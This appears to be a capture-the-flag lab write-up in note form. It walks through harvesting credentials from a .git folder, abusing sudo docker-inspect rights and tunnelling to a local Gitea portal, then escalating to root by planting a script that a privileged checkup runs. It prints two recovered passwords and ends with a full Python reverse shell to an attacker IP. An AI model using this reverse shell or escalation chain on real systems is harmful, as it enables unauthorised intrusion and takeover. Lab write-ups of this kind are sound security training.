First we look around a little bit, and first order of business is always looking for credentials - especially when we've noticed that SSH is open. A good place to look is in hidden folders like .git.
And love and behold. 
![[Pasted image 20230720204611.png]]
``jh1usoih2bkjaspwe92``

Lets get an encrypted connection and a much more stable shell connection:
![[Pasted image 20230717200052.png]]

Lets look at whether or not we can run something as root:
![[Pasted image 20230717201441.png]]

We know that the asterix means that it takes a parameter, lets look at it:
![[Pasted image 20230720205010.png]]

![[Pasted image 20230720205041.png]]

We have some interesting docker-containers running here, but we do not have rights to actually read the related files. In order to access the gitea-portal we have to create a tunnel, since it's restricted to localhost:
![[Pasted image 20230717220627.png]]
![[Pasted image 20230717220611.png]]
![[Pasted image 20230720205233.png]]

Its safe to assume that the creds to the administrator account is stored in the mysql db. We know that we have access to docker-inspect, so all we need to do is figure out how to get the contents of the database:
![[Pasted image 20230720202645.png]]
``yuiu1hoiu4i5ho1uh``


We log in using the creds, and we find the source-code of the script-files:
![[Pasted image 20230720205357.png]]

The interesting part is in the system-checkup.py file:
![[Pasted image 20230720205440.png]]
It executes a full-checkup.sh file in the current working directory, so all we really have to do is actually create a full-checkup.sh some place we have write-access and embed our shell into that:

```python
#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.194",9999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

![[Pasted image 20230720203758.png]]
